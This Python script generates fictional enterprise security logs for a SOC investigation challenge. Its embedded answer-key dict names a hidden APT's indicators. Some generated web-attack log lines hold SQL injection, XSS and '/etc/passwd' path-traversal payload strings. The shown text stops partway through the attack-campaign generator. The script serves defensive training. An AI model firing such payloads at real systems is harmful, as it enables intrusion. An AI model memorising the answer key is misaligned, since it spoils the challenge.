#!/usr/bin/env python3
"""
ANIMUS 1.0 -- TEMPLAR SOC -- enterprise telemetry generator v3 (FINAL PRODUCTION).

Large-scale, internally-consistent enterprise dataset for the SOC Investigation
challenge. Four simultaneous storylines across an 8-day window, now with a full
IT ticketing layer tying every legitimate privileged action to a verifiable
change record -- the Rogue Assassin campaign is the only activity in the whole
dataset with NO matching ticket, which is the deliberate cross-source signal
players must find (not a single clean IOC).

  * NORMAL enterprise activity across HR, Finance, Legal, Dev, Executive, IT
  * GOOD ASSASSIN week-long attack campaign (loud, ticketed, contained, closed)
  * TEMPLAR SOC defensive activity (case lifecycle, containment, remediation)
  * ROGUE ASSASSIN APT (hidden, buried under noise, deliberately including
    several near-miss decoys per stage that require ticket/account/path
    correlation to eliminate -- never a single-event filter)

Deterministic (fixed seed) so the answer key is exact.

Env:
  HEC_URL   (default https://127.0.0.1:8088/services/collector/event)
  HEC_TOKEN (required to actually send)
  DRYRUN=1  (print counts + summary, do not send)
"""
import os, json, random, urllib.request, ssl, datetime as dt
from collections import Counter

random.seed(20260622)
INDEX = "templar_investigation"
HEC_URL = os.environ.get("HEC_URL", "https://127.0.0.1:8088/services/collector/event")
HEC_TOKEN = os.environ.get("HEC_TOKEN", "")
DRYRUN = os.environ.get("DRYRUN") == "1"

# ---------------------------------------------------------------- environment
DOMAIN = "templarhq.local"
NB = "TEMPLARHQ"

HOSTS = {
    "DC-01": "10.10.10.10", "DC-02": "10.10.10.11",
    "FS-01": "10.10.10.31", "FS-02": "10.10.10.30",
    "SQL-01": "10.10.10.40", "SQL-02": "10.10.10.41",
    "APP-01": "10.10.10.45",
    "MAIL-01": "10.10.10.25", "PROXY-01": "10.10.10.26",
    "VPN-GW": "10.10.10.5", "WEBPUB-01": "10.10.20.15",
    "JUMP-01": "10.10.10.50", "ADMIN-WS": "10.10.30.21",
    "SOC-01": "10.10.30.10", "VAULT-SRV": "10.10.10.60",
    "DEV-01": "10.10.30.201", "DEV-02": "10.10.30.202",
    "WKS-101": "10.10.30.101", "WKS-102": "10.10.30.102", "WKS-103": "10.10.30.103",
    "WKS-104": "10.10.30.104", "WKS-105": "10.10.30.105", "WKS-106": "10.10.30.106",
    "WKS-107": "10.10.30.107", "WKS-108": "10.10.30.108", "WKS-109": "10.10.30.109",
    "WKS-110": "10.10.30.110", "WKS-111": "10.10.30.111", "WKS-112": "10.10.30.112",
}
WKS = [h for h in HOSTS if h.startswith("WKS-")]
DEV_WKS = ["DEV-01", "DEV-02"]
SERVERS = ["FS-01", "FS-02", "SQL-01", "SQL-02", "APP-01", "MAIL-01", "PROXY-01", "VAULT-SRV"]
WEBPUB_PUBLIC = "203.0.113.15"

# ---- Org roster: department-tagged, includes executives ---------------------
DEPARTMENTS = {
    "t.deveraux": "IT", "a.mercer": "IT",
    "r.okoye": "Security", "l.chen": "Security",
    "m.brandt": "Finance", "h.solberg": "Finance",
    "p.ibarra": "Legal", "n.adeyemi": "HR",
    "c.moreau": "Executive Office", "w.tanaka": "Facilities",
    "b.fontaine": "IT (Contractor)",
    "d.okonkwo": "Development", "s.reyes": "Development",
    "k.westbrook": "Executive", "helpdesk01": "IT",
}
USERS = list(DEPARTMENTS.keys())
SOC_ANALYSTS = ["r.okoye", "l.chen"]
IT_ADMINS = ["a.mercer", "t.deveraux"]
DEVS = ["d.okonkwo", "s.reyes"]
EXECS = ["c.moreau", "k.westbrook"]
NEW_HIRES = ["e.svensson", "g.okafor"]   # onboarded day 3 -- legit false-positive cover
SVC = ["svc_backup", "svc_sql", "svc_iis"]

# ---- Rogue Assassin campaign constants (THE ANSWER KEY) --------------------
RA = dict(
    foothold_account="svc_backup",
    foothold_vpn_ip="91.219.236.14",
    foothold_host="JUMP-01",
    c2_domain="cdn-assets-sync.net",
    c2_ip="185.220.101.44",
    dns_tunnel_domain="sync-telemetry.net",
    payload_path=r"C:\ProgramData\Sync\svchost.exe",
    payload_sha256="9f2b3c7d1a4e6f8b0c2d4e6a8b1c3d5f7091a2b3c4d5e6f7081920a1b2c3d4e5",
    defender_exclusion=r"C:\ProgramData\Sync",
    procdump_path=r"C:\ProgramData\Sync\pd.exe",
    sched_task="TemplarSyncUpdater",
    service_name="WinSyncSvc",
    run_key_value="SyncHealth",
    backdoor_account="svc_health",
    kerberoast_target="svc_sql",
    gpo_name="Templar-Sync-Policy",
    gpo_guid="{7B9E1C4A-2F8D-4A6E-9C3B-1D5E7F9A0B2C}",
    sensitive_group="Vault Administrators",
    vault_share=r"\\VAULT-SRV\Research\AppleOfEden",
    badge_employee="m.brandt",
    badge_id="BADGE-4471",
    exfil_archive="aoe_research_data.7z",
    evidence_share=r"\\FS-02\Evidence",
    operator_handle="M4L1K",
    taunt_file=r"C:\ProgramData\Sync\README_RA.txt",
    fragment_case_id="GA-CASE-0004",
    fragment_file="webshell_upload_screenshot_002.png",
    fragment_host="FS-02",
)
RA["fragment_path"] = rf"\\FS-02\Evidence\CaseFiles\{RA['fragment_case_id']}\{RA['fragment_file']}"

# ---- Good Assassin infra (SOC already knows / has blocked all of this) -----
GA_IPS = [f"198.51.{o}.{random.randint(2,254)}" for o in range(100, 118)]
GA_RDP_IPS = [f"203.0.114.{random.randint(2,254)}" for _ in range(10)]
GA_PHISH_DOMAINS = ["secure-office365-verify.com", "templarhq-support-portal.net", "docu-sign-review.info"]
GA_WEBSHELL = "/uploads/sync_diag.aspx"
GA_MALWARE_SHA = "c4e1a2b3d4e5f6071829a3b4c5d6e7f8091a2b3c4d5e6f7081920a1b2c3d4e6"

# legit "false-positive cover" decoys -- each now tied to a real ticket
LEGIT_TRAVEL = [
    ("h.solberg", "77.88.55.12", "Norway"),
    ("p.ibarra", "181.94.22.7", "Argentina"),
]
LEGIT_HELPDESK_TOOL = r"C:\IT\Tools\MemCapture.exe"
LEGIT_GPO_ADMIN = "a.mercer"
LEGIT_EMERGENCY_SVC_ACCOUNT = "svc_iis"          # near-miss decoy for INV-1
LEGIT_EMERGENCY_SVC_IP = "196.44.78.201"         # foreign IP, but ticketed
LEGIT_CONTRACTOR_CREATOR = "a.mercer"            # near-miss decoy for INV-3
LEGIT_CONTRACTOR_ACCOUNT = "svc_reporting"

# time window: 8 days (day 0..7), freeze at end
BASE = dt.datetime(2026, 6, 22, 0, 0, 0, tzinfo=dt.timezone.utc)  # Monday
def day(n, h=0, m=0, s=0):
    return BASE + dt.timedelta(days=n, hours=h, minutes=m, seconds=s)
def epoch(d): return d.timestamp()
def wts(d): return d.strftime("%m/%d/%Y %I:%M:%S %p")

EVENTS = []
def emit(d, host, st, source, raw):
    EVENTS.append((epoch(d), host, st, source, raw))

def kv(**k):
    parts = []
    for key, val in k.items():
        v = str(val)
        if " " in v or "\\" in v or '"' in v:
            v = '"' + v.replace('"', "'") + '"'
        parts.append(f"{key}={v}")
    return " ".join(parts)

# ---------------------------------------------------------------- builders
def sec(d, host, code, msg, **fields):
    raw = f"{wts(d)} LogName=Security EventCode={code} EventType=0 ComputerName={host}.{DOMAIN} " + kv(**fields) + f' Message="{msg}"'
    emit(d, host, "WinEventLog:Security", "templar:winlog:security", raw)

def system(d, host, code, msg, **fields):
    raw = f"{wts(d)} LogName=System EventCode={code} ComputerName={host}.{DOMAIN} " + kv(**fields) + f' Message="{msg}"'
    emit(d, host, "WinEventLog:System", "templar:winlog:system", raw)

def sysmon(d, host, code, **fields):
    raw = f"{wts(d)} LogName=Microsoft-Windows-Sysmon/Operational EventCode={code} ComputerName={host}.{DOMAIN} " + kv(**fields)
    emit(d, host, "WinEventLog:Sysmon", "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", raw)

def posh(d, host, script, user):
    raw = f"{wts(d)} LogName=Microsoft-Windows-PowerShell/Operational EventCode=4104 ComputerName={host}.{DOMAIN} " + kv(User=user, ScriptBlockText=script)
    emit(d, host, "WinEventLog:PowerShell/Operational", "templar:winlog:powershell", raw)

def defender(d, host, code, threat, action, **fields):
    raw = f"{wts(d)} LogName=Microsoft-Windows-Windows Defender/Operational EventCode={code} ComputerName={host}.{DOMAIN} " + kv(ThreatName=threat, Action=action, **fields)
    emit(d, host, "WinEventLog:Windows Defender/Operational", "templar:winlog:defender", raw)

def dns(d, host, src_ip, query, qtype="A", answer=""):
    raw = kv(src_ip=src_ip, query=query, query_type=qtype, answer=answer, host=host)
    emit(d, host, "stream:dns", "stream:dns", raw)

def iis(d, src_ip, method, uri, status, ua, bytes_out=0, host="WEBPUB-01"):
    raw = f'{d.strftime("%Y-%m-%d %H:%M:%S")} {HOSTS["WEBPUB-01"]} {method} {uri} - 443 - {src_ip} {ua} - {status} 0 0 {bytes_out}'
    emit(d, host, "animus:web:access", "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\access.log", raw)

def vpn(d, user, src_ip, result):
    raw = kv(user=user, src_ip=src_ip, result=result, gateway="VPN-GW", protocol="SSL-VPN")
    emit(d, "VPN-GW", "templar:vpn", "templar:vpn", raw)

def fw(d, src_ip, dest_ip, dest_port, action, proto="tcp"):
    raw = kv(src_ip=src_ip, dest_ip=dest_ip, dest_port=dest_port, action=action, protocol=proto, device="FW-01")
    emit(d, "FW-01", "templar:firewall", "templar:firewall", raw)

def proxy(d, user, src_ip, dest_domain, category, action, bytes_out=0, host="PROXY-01"):
    raw = kv(user=user, src_ip=src_ip, dest_domain=dest_domain, category=category, action=action, bytes_out=bytes_out)
    emit(d, host, "templar:proxy", "templar:proxy", raw)

def mail(d, sender, recipient, subject, action, attachment="", sha256="", verdict="", host="MAIL-01"):
    raw = kv(sender=sender, recipient=recipient, subject=subject, action=action,
             attachment=attachment, sha256=sha256, verdict=verdict)
    emit(d, host, "templar:mail", "templar:mail", raw)

def waf(d, src_ip, uri, rule, action, attack_type, host="WEBPUB-01"):
    raw = kv(src_ip=src_ip, uri=uri, rule=rule, action=action, attack_type=attack_type, host=host)
    emit(d, host, "templar:waf", "templar:waf", raw)

def ids(d, src_ip, dest_ip, dest_port, signature, severity, action, host="IDS-01"):
    raw = kv(src_ip=src_ip, dest_ip=dest_ip, dest_port=dest_port, signature=signature, severity=severity, action=action)
    emit(d, host, "templar:ids", "templar:ids", raw)

def edr(d, host, user, threat, action, technique="", process=""):
    raw = kv(host=host, user=user, threat=threat, action=action, technique=technique, process=process)
    emit(d, host, "templar:edr", "templar:edr", raw)

def badge(d, badge_id, employee, location, direction, result, device="BADGE-CTRL"):
    raw = kv(badge_id=badge_id, employee=employee, location=location, direction=direction, result=result)
    emit(d, device, "templar:badge", "templar:badge", raw)

def soc_case(d, case_id, title, category, severity, status, analyst, note="", source_ips="", affected_hosts=""):
    raw = kv(case_id=case_id, title=title, category=category, severity=severity, status=status,
             assigned_analyst=analyst, note=note, source_ips=source_ips, affected_hosts=affected_hosts)
    emit(d, "SOC-CASE-MGMT", "templar:soc_case", "templar:soc_case", raw)

def ticket(d, ticket_id, title, category, status, requestor, approver="", related_case="", notes=""):
    raw = kv(ticket_id=ticket_id, title=title, category=category, status=status,
             requestor=requestor, approver=approver, related_case=related_case, notes=notes)
    emit(d, "ITSM-01", "templar:ticket", "templar:ticket", raw)

def hr(d, event_type, employee, department, manager="", notes=""):
    raw = kv(event_type=event_type, employee=employee, department=department, manager=manager, notes=notes)
    emit(d, "HRIS-01", "templar:hr", "templar:hr", raw)

def software(d, host, action, package, version, installed_by, ticket_id=""):
    raw = kv(action=action, package=package, version=version, installed_by=installed_by, ticket_id=ticket_id)
    emit(d, host, "templar:software", "templar:software", raw)

def browser(d, host, user, url, action, filename=""):
    raw = kv(user=user, url=url, action=action, filename=filename)
    emit(d, host, "templar:browser", "templar:browser", raw)

UA = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36"
BOTUA = "python-requests/2.31"

# ================================================================ NORMAL BASELINE
def gen_normal():
    legit_dns = ["www.microsoft.com", "windowsupdate.microsoft.com", "login.microsoftonline.com",
                 "templarhq.local", "dc-01.templarhq.local", "time.windows.com", "teams.microsoft.com",
                 "outlook.office365.com", "fs-01.templarhq.local", "sql-01.templarhq.local",
                 "graph.microsoft.com", "cdn.jsdelivr.net", "github.com", "npmjs.org"]
    proxy_domains = ["news.bbc.co.uk", "linkedin.com", "wikipedia.org", "salesforce.com",
                      "adobe.com", "zoom.us", "dropbox.com", "amazon.com", "github.com", "slack.com",
                      "workday.com", "quickbooks.intuit.com", "docusign.com", "atlassian.net"]
    browse_targets = ["stackoverflow.com/questions/", "docs.microsoft.com/en-us/", "github.com/templarhq/",
                       "npmjs.com/package/", "confluence.templarhq.local/wiki/", "jira.templarhq.local/browse/"]
    all_wks = WKS + DEV_WKS
    for n in range(8):
        weekend = n in (5, 6)
        logon_n = random.randint(80, 150) if weekend else random.randint(300, 480)
        for _ in range(logon_n):
            h = random.choice(all_wks + ["FS-01", "FS-02", "SQL-01", "SQL-02", "APP-01"])
            u = random.choice(USERS)
            t = day(n, random.randint(7, 19), random.randint(0, 59), random.randint(0, 59))
            sec(t, h, 4624, "An account was successfully logged on.",
                Logon_Type=random.choice([2, 3, 7]), Account_Name=u, Account_Domain=NB,
                Source_Network_Address=HOSTS.get(random.choice(all_wks)), Logon_Process="Kerberos",
                Authentication_Package="Kerberos")
        dns_n = random.randint(600, 900) if weekend else random.randint(1200, 1800)
        for _ in range(dns_n):
            t = day(n, random.randint(6, 22), random.randint(0, 59), random.randint(0, 59))
            h = random.choice(all_wks)
            dns(t, h, HOSTS.get(h, "10.10.30.50"), random.choice(legit_dns), "A", "10.10.10.10")
        iis_n = random.randint(200, 350) if weekend else random.randint(400, 700)
        for _ in range(iis_n):
            t = day(n, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59))
            ip = f"198.{random.randint(18,20)}.{random.randint(1,254)}.{random.randint(1,254)}"
            iis(t, ip, "GET", random.choice(["/", "/index.html", "/about", "/contact", "/assets/app.js", "/health", "/careers"]),
                200, UA, random.randint(200, 4000))
        proxy_n = random.randint(300, 500) if weekend else random.randint(900, 1400)
        for _ in range(proxy_n):
            t = day(n, random.randint(7, 20), random.randint(0, 59), random.randint(0, 59))
            u = random.choice(USERS)
            h = random.choice(all_wks)
            proxy(t, u, HOSTS.get(h, "10.10.30.50"), random.choice(proxy_domains), "business", "allow", random.randint(1000, 90000))
        mail_n = random.randint(80, 150) if weekend else random.randint(300, 500)
        for _ in range(mail_n):
            t = day(n, random.randint(7, 19), random.randint(0, 59), random.randint(0, 59))
            u = random.choice(USERS)
            mail(t, f"{random.choice(['partner','vendor','client'])}@{random.choice(['acme-corp.com','globex.com','initech.net'])}",
                 f"{u}@templarhq.local", random.choice(["Q3 Proposal", "Meeting Notes", "Invoice #4471", "Project Update", "Contract Draft"]),
                 "delivered", verdict="clean")
        tb = day(n, 1, 30, 0)
        sec(tb, "FS-01", 4624, "An account was successfully logged on.", Logon_Type=5,
            Account_Name="svc_backup", Account_Domain=NB, Logon_Process="Advapi", Authentication_Package="Negotiate")
        # JUMP-01 is a restricted admin bastion host -- only IT/Security staff, low volume, business hours
        if not weekend:
            for _ in range(random.randint(1, 3)):
                t = day(n, random.randint(8, 18), random.randint(0, 59), random.randint(0, 59))
                u = random.choice(IT_ADMINS + SOC_ANALYSTS)
                sec(t, "JUMP-01", 4624, "An account was successfully logged on.",
                    Logon_Type=random.choice([2, 10]), Account_Name=u, Account_Domain=NB,
                    Source_Network_Address=HOSTS.get(random.choice(["ADMIN-WS", "SOC-01"])),
                    Logon_Process="Kerberos", Authentication_Package="Kerberos")
        proc_n = random.randint(100, 180) if weekend else random.randint(280, 420)
        for _ in range(proc_n):
            t = day(n, random.randint(7, 19), random.randint(0, 59))
            h = random.choice(all_wks)
            img = random.choice([r"C:\Windows\System32\svchost.exe", r"C:\Program Files\Microsoft Office\WINWORD.EXE",
                                  r"C:\Windows\System32\cmd.exe", r"C:\Program Files\Google\Chrome\chrome.exe",
                                  r"C:\Program Files\Microsoft Office\EXCEL.EXE", r"C:\Windows\System32\notepad.exe"])
            sysmon(t, h, 1, Image=img, User=f"{NB}\\{random.choice(USERS)}",
                   ParentImage=r"C:\Windows\explorer.exe", CommandLine=img)
        for _ in range(random.randint(30, 60)):
            t = day(n, random.randint(7, 19), random.randint(0, 59))
            h = random.choice(all_wks + SERVERS)
            system(t, h, random.choice([19, 20, 7036]), "Routine system/service event.", component="WindowsUpdate")
        for _ in range(random.randint(1, 3)):
            t = day(n, random.randint(8, 18), random.randint(0, 59))
            h = random.choice(["JUMP-01", "ADMIN-WS", "SOC-01"] + SERVERS)
            u = random.choice(IT_ADMINS)
            script = random.choice([
                "Get-Service -Name Spooler | Restart-Service",
                "Test-NetConnection -ComputerName dc-01.templarhq.local -Port 389",
                "Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\\IT\\reports\\logon_audit.csv",
                "Get-EventLog -LogName System -Newest 50",
                "Get-WmiObject Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending",
            ])
            posh(t, h, script, u)
        badge_n = random.randint(20, 40) if weekend else random.randint(80, 140)
        for _ in range(badge_n):
            t = day(n, random.randint(6, 20), random.randint(0, 59))
            emp = random.choice(USERS)
            loc = "Server Room / Vault Access" if emp == "w.tanaka" else "Main Office"
            badge(t, f"BADGE-{random.randint(1000,9999)}", emp, loc, random.choice(["in", "out"]), "granted")
        # developer activity: repo browsing, package installs, dev-server logons
        for _ in range(random.randint(15, 35) if not weekend else random.randint(2, 8)):
            t = day(n, random.randint(8, 21), random.randint(0, 59))
            h = random.choice(DEV_WKS)
            u = random.choice(DEVS)
            browser(t, h, u, "https://" + random.choice(browse_targets) + str(random.randint(100, 9999)), "visit")
        for _ in range(random.randint(1, 4)):
            t = day(n, random.randint(9, 18), random.randint(0, 59))
            software(t, random.choice(DEV_WKS + ["DEV-01"]), "install",
                     random.choice(["node", "python3-pip", "docker-ce", "vscode", "git"]),
                     f"{random.randint(1,20)}.{random.randint(0,9)}.{random.randint(0,9)}", random.choice(DEVS))
        # patch management (WSUS-style) noise across the fleet
        for _ in range(random.randint(3, 8)):
            t = day(n, random.randint(2, 5), random.randint(0, 59))
            h = random.choice(all_wks + SERVERS)
            software(t, h, "patch", f"KB{random.randint(5030000,5045000)}", "n/a", "svc_wsus", ticket_id="")
        # finance / HR routine system activity (financial app logons, HR record views -- no security relevance, pure noise)
        for _ in range(random.randint(10, 25) if not weekend else random.randint(1, 5)):
            t = day(n, random.randint(8, 18), random.randint(0, 59))
            u = random.choice(["m.brandt", "h.solberg"])
            proxy(t, u, HOSTS.get("WKS-101", "10.10.30.101"), "quickbooks.intuit.com", "finance", "allow", random.randint(500, 5000))
        for _ in range(random.randint(3, 10) if not weekend else 0):
            t = day(n, random.randint(8, 17), random.randint(0, 59))
            emp = random.choice(USERS)
            hr(t, "record_view", emp, DEPARTMENTS.get(emp, "General"), manager="n.adeyemi", notes="Routine HR record access.")

# ================================================================ GOOD ASSASSIN CAMPAIGN + SOC RESPONSE + TICKETS
def gen_good_assassin():
    for ip in GA_IPS:
        IOC_ENTRIES.append((ip, "ip", "Good Assassin recon/brute-force infrastructure"))
    for ip in GA_RDP_IPS:
        IOC_ENTRIES.append((ip, "ip", "Good Assassin RDP brute-force infrastructure"))
    for dom in GA_PHISH_DOMAINS:
        IOC_ENTRIES.append((dom, "domain", "Good Assassin phishing infrastructure"))
    IOC_ENTRIES.append((GA_MALWARE_SHA, "hash", "Good Assassin phishing malware payload"))

    # ---- Day 0 (06-22): Recon
    for i in range(220):
        t = day(0, 9 + i // 60, (i * 3) % 60, (i * 7) % 60)
        ip = random.choice(GA_IPS)
        ids(t, ip, HOSTS["WEBPUB-01"], random.choice([80, 443, 22, 3389, 8080]),
            "ET SCAN Nmap Scripting Engine User-Agent", "medium", "alert")
        dns(t, "WEBPUB-01", ip, f"{random.choice(['admin','dev','test','api','staging'])}.templarhq.xyz", "A", "0.0.0.0")
    soc_case(day(0, 9, 5, 0), "GA-CASE-0001", "External Reconnaissance Against Public Infrastructure",
             "Reconnaissance", "Low", "opened", "r.okoye", source_ips=",".join(GA_IPS[:5]))
    soc_case(day(0, 11, 0, 0), "GA-CASE-0001", "External Reconnaissance Against Public Infrastructure",
             "Reconnaissance", "Low", "investigating", "r.okoye", note="Confirmed automated scanning, no exploitation observed.")
    soc_case(day(0, 16, 0, 0), "GA-CASE-0001", "External Reconnaissance Against Public Infrastructure",
             "Reconnaissance", "Low", "closed", "r.okoye", note="Source IPs added to watchlist. Monitoring only.")
    ticket(day(0, 16, 5, 0), "TCK-1001", "Investigate scanning traffic against WEBPUB-01", "Security",
           "closed", "r.okoye", approver="l.chen", related_case="GA-CASE-0001", notes="Watchlist updated, no action required.")

    # ---- Day 1 (06-23): Credential stuffing / brute force -- RA STAGE 1 hides here
    fail_n = random.randint(3200, 4200)
    for i in range(fail_n):
        t = day(1, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59))
        ip = random.choice(GA_IPS)
        u = random.choice(["admin", "administrator", "t.deveraux", "a.mercer", "helpdesk01", "svc_backup", "root", "test"])
        sec(t, "VPN-GW", 4625, "An account failed to log on.", Logon_Type=3,
            Account_Name=u, Account_Domain=NB, Source_Network_Address=ip, Sub_Status="0xC000006A")
    for u in ["t.deveraux", "helpdesk01"]:
        sec(day(1, 14, random.randint(0, 59), 0), "VPN-GW", 4740, "A user account was locked out.",
            Target_Account_Name=u, Caller_Computer_Name="VPN-GW")
    for ip in GA_IPS:
        fw(day(1, 15, 0, 0), ip, HOSTS["VPN-GW"], 443, "deny")
    soc_case(day(1, 6, 30, 0), "GA-CASE-0002", "Credential Stuffing Campaign Against VPN/OWA",
              "Credential Access", "Medium", "opened", "l.chen", source_ips=",".join(GA_IPS[:5]))
    soc_case(day(1, 10, 0, 0), "GA-CASE-0002", "Credential Stuffing Campaign Against VPN/OWA",
              "Credential Access", "Medium", "investigating", "l.chen", note="High volume of failed logons, distributed source IPs, dictionary usernames.")
    soc_case(day(1, 15, 30, 0), "GA-CASE-0002", "Credential Stuffing Campaign Against VPN/OWA",
              "Credential Access", "Medium", "contained", "l.chen", note="All known source IPs blocked at firewall.")
    soc_case(day(1, 17, 0, 0), "GA-CASE-0002", "Credential Stuffing Campaign Against VPN/OWA",
              "Credential Access", "Medium", "closed", "l.chen", note="Locked accounts reset. No successful compromise identified from known GA infrastructure.")
    ticket(day(1, 17, 5, 0), "TCK-1002", "Block credential-stuffing source IPs / reset locked accounts", "Security",
           "closed", "l.chen", approver="r.okoye", related_case="GA-CASE-0002", notes="Firewall rule TCK-1002 applied; t.deveraux and helpdesk01 passwords reset.")
    # legit foreign travel decoys
    for u, ip, country in LEGIT_TRAVEL:
        t = day(1, random.randint(8, 20), random.randint(0, 59), 0)
        vpn(t, u, ip, "success")
        sec(t, "VPN-GW", 4624, "An account was successfully logged on.", Logon_Type=10,
            Account_Name=u, Account_Domain=NB, Source_Network_Address=ip, Logon_Process="User32", Authentication_Package="Negotiate")
        proxy(day(1, random.randint(8, 20), 30, 0), u, ip, "outlook.office365.com", "business", "allow", 45000)
    # near-miss decoy #1: legit emergency service-account VPN access, ticketed, distinguishing INV-1 from a clean single-filter answer
    t_dec1 = day(1, 9, 5, 0)
    vpn(t_dec1, LEGIT_EMERGENCY_SVC_ACCOUNT, LEGIT_EMERGENCY_SVC_IP, "success")
    sec(t_dec1, "WEBPUB-01", 4624, "An account was successfully logged on.", Logon_Type=10,
        Account_Name=LEGIT_EMERGENCY_SVC_ACCOUNT, Account_Domain=NB, Source_Network_Address=LEGIT_EMERGENCY_SVC_IP,
        Logon_Process="User32", Authentication_Package="Negotiate")
    ticket(day(1, 8, 45, 0), "TCK-1003", "Emergency remote cert renewal for WEBPUB-01 (svc_iis)", "Change Request",
           "closed", "a.mercer", approver="t.deveraux", notes="Pre-approved emergency change window 09:00-09:30 UTC for TLS cert renewal via svc_iis from vendor-hosted jump box 196.44.78.201.")

    # ---- Day 2 (06-24): Phishing campaign -- RA STAGE 2 hides here
    blocked_n = random.randint(180, 260)
    for _ in range(blocked_n):
        t = day(2, random.randint(6, 20), random.randint(0, 59), 0)
        mail(t, f"noreply@{random.choice(GA_PHISH_DOMAINS)}", f"{random.choice(USERS)}@templarhq.local",
             random.choice(["Your Password Expires Today", "Invoice Overdue - Action Required", "Shared Document Awaiting Review"]),
             "blocked", attachment="invoice.html", verdict="phishing")
    victims = ["m.brandt", "c.moreau"]
    for u in victims:
        t = day(2, random.randint(9, 15), random.randint(0, 59), 0)
        mail(t, f"noreply@{GA_PHISH_DOMAINS[0]}", f"{u}@templarhq.local", "Your Password Expires Today",
             "delivered", attachment="invoice_update.exe", sha256=GA_MALWARE_SHA, verdict="malicious-clicked")
        h = random.choice(WKS)
        sysmon(t, h, 1, Image=r"C:\Users\Public\invoice_update.exe", User=f"{NB}\\{u}",
               ParentImage=r"C:\Program Files\Microsoft Office\OUTLOOK.EXE", CommandLine=r"invoice_update.exe")
        defender(t + dt.timedelta(seconds=20), h, 1116, "Trojan:Win32/Emotet.GA!MTB", "Quarantined", Path=r"C:\Users\Public\invoice_update.exe")
        edr(t + dt.timedelta(seconds=25), h, u, "Trojan:Win32/Emotet.GA!MTB", "quarantined", technique="T1566.001 Spearphishing Attachment", process="invoice_update.exe")
    soc_case(day(2, 9, 40, 0), "GA-CASE-0003", "Phishing Campaign - Malware Execution on 2 Endpoints",
              "Execution", "High", "opened", "r.okoye", affected_hosts="2 workstations")
    soc_case(day(2, 11, 0, 0), "GA-CASE-0003", "Phishing Campaign - Malware Execution on 2 Endpoints",
              "Execution", "High", "investigating", "r.okoye", note="EDR auto-quarantined payload on both hosts before further execution.")
    soc_case(day(2, 14, 0, 0), "GA-CASE-0003", "Phishing Campaign - Malware Execution on 2 Endpoints",
              "Execution", "High", "contained", "r.okoye", note="Hosts isolated, credentials for m.brandt and c.moreau reset as precaution.")
    soc_case(day(2, 17, 30, 0), "GA-CASE-0003", "Phishing Campaign - Malware Execution on 2 Endpoints",
              "Execution", "High", "closed", "r.okoye", note="No further lateral activity observed from either host. Sender domain blocked.")
    ticket(day(2, 17, 35, 0), "TCK-1004", "Isolate and remediate 2 phishing-compromised endpoints", "Security",
           "closed", "r.okoye", approver="l.chen", related_case="GA-CASE-0003", notes="Both hosts re-imaged, credentials reset.")

    # ---- Day 3 (06-25): Web attack / webshell upload -- RA STAGE 3 hides here, legit onboarding same day
    for i in range(random.randint(250, 350)):
        t = day(3, 8 + i // 40, (i * 5) % 60, (i * 3) % 60)
        ip = random.choice(GA_IPS)
        param = random.choice(["id=1' OR '1'='1", "id=1;DROP TABLE users--", "<script>alert(1)</script>", "../../../../etc/passwd"])
        waf(t, ip, f"/search?q={param}", random.choice(["SQLI-001", "XSS-002", "LFI-003"]), "block",
            random.choice(["SQLi", "XSS", "PathTraversal"]))
        iis(t, ip, "GET", "/search", 403, BOTUA, 0)
    tshell = day(3, 10, 25, 11)
    iis(tshell, GA_IPS[0], "POST", GA_WEBSHELL, 403, BOTUA, 0)
    defender(tshell, "WEBPUB-01", 1116, "Backdoor:ASP/WebShell.SB", "Blocked", Path=f"C:\\inetpub\\wwwroot{GA_WEBSHELL}")
    fw(day(3, 10, 30, 0), GA_IPS[0], WEBPUB_PUBLIC, 443, "deny")
    system(day(3, 12, 0, 0), "WEBPUB-01", 19, "Installation Successful: Windows successfully installed update KB5039217 (IIS security patch).", update="KB5039217")
    soc_case(day(3, 10, 40, 0), "GA-CASE-0004", "Web Application Attack - Webshell Upload Attempt",
              "Initial Access", "High", "opened", "r.okoye", affected_hosts="WEBPUB-01")
    soc_case(day(3, 11, 30, 0), "GA-CASE-0004", "Web Application Attack - Webshell Upload Attempt",
              "Initial Access", "High", "investigating", "r.okoye", note="WAF and Defender both blocked the upload before it could execute.")
    soc_case(day(3, 13, 0, 0), "GA-CASE-0004", "Web Application Attack - Webshell Upload Attempt",
              "Initial Access", "High", "contained", "r.okoye", note="Source IP blocked at firewall.")
    soc_case(day(3, 15, 0, 0), "GA-CASE-0004", "Web Application Attack - Webshell Upload Attempt",
              "Initial Access", "High", "closed", "r.okoye", note="IIS security patch KB5039217 applied. No shell obtained.")
    ticket(day(3, 15, 5, 0), "TCK-1005", "Patch IIS security vulnerability on WEBPUB-01 (KB5039217)", "Change Request",
           "closed", "r.okoye", approver="a.mercer", related_case="GA-CASE-0004", notes="Patch deployed, case closed same day.")
    sysmon(day(3, 13, 5, 0), "FS-02", 11, Image=r"C:\Windows\explorer.exe", User=f"{NB}\\r.okoye",
           TargetFilename=rf"\FS-02\Evidence\CaseFiles\GA-CASE-0004\webshell_upload_screenshot_001.png",
           Hashes="SHA256=1a2b3c4d5e6f7081920a1b2c3d4e5f6071829a3b4c5d6e7f8091a2b3c4d5e60")
    sec(day(3, 13, 6, 0), "FS-02", 5140, "A network share object was accessed.",
        Share_Name=RA["evidence_share"], Account_Name="r.okoye", Source_Address=HOSTS["SOC-01"])
    # legit onboarding
    for u in NEW_HIRES:
        t = day(3, random.randint(9, 12), random.randint(0, 59), 0)
        sec(t, "DC-01", 4720, "A user account was created.", Target_Account_Name=u, Subject_Account_Name="svc_hr_provisioning")
        sec(t + dt.timedelta(minutes=2), "DC-01", 4728, "A member was added to a security-enabled global group.",
            Group_Name="Domain Users", Member_Account_Name=u, Subject_Account_Name="svc_hr_provisioning")
        hr(t - dt.timedelta(hours=1), "onboarding", u, "General", manager="n.adeyemi", notes="New hire start date, AD account provisioned via standard onboarding workflow.")
    # near-miss decoy #2: legit contractor service account creation, ticketed, distinguishes INV-3 from a single-filter answer
    t_dec2 = day(3, 14, 0, 0)
    sec(t_dec2, "DC-01", 4720, "A user account was created.",
        Target_Account_Name=LEGIT_CONTRACTOR_ACCOUNT, Subject_Account_Name=LEGIT_CONTRACTOR_CREATOR)
